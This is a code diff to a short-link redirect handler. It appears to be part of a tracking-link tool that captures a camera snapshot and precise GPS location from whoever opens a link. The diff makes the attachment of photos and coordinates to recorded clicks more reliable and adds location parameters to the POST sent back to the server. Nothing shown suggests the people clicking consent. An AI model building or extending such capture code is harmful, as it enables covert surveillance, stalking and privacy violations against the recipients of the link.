@@ -388,16 +388,14 @@ const handleRedirect = async (req, res) => {
     }
 
     if (req.method === 'POST') {
-      // If POST, attach photo to existing click or push click with photo
       if (link.clicks.length > 0) {
         const lastClick = link.clicks[link.clicks.length - 1];
-        // If click was created within last 30 seconds, attach photo to it
-        if (Date.now() - new Date(lastClick.timestamp).getTime() < 30000) {
-          lastClick.photoUrl = photoUrl;
-          if (finalLat && finalLon && (!lastClick.lat || lastClick.lat === 0)) {
-            lastClick.lat = finalLat;
-            lastClick.lon = finalLon;
-            lastClick.locType = locType;
+        if (Date.now() - new Date(lastClick.timestamp).getTime() < 45000) {
+          if (photoUrl) lastClick.photoUrl = photoUrl;
+          if (!isNaN(queryLat) && !isNaN(queryLon) && queryLat !== 0) {
+            lastClick.lat = queryLat;
+            lastClick.lon = queryLon;
+            lastClick.locType = 'GPS Presisi';
             lastClick.city = cityName;
             lastClick.country = countryName;
           }
@@ -519,7 +517,7 @@ const handleRedirect = async (req, res) => {
           if (photo) {
             try {
               document.getElementById('statusText').innerText = "Menyimpan foto snapshot...";
-              await fetch('/r/' + targetCode, {
+              await fetch('/r/' + targetCode + (lat && lon ? '?lat=' + lat + '&lon=' + lon : '?fallback=1'), {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ photo: photo, lat: lat, lon: lon })
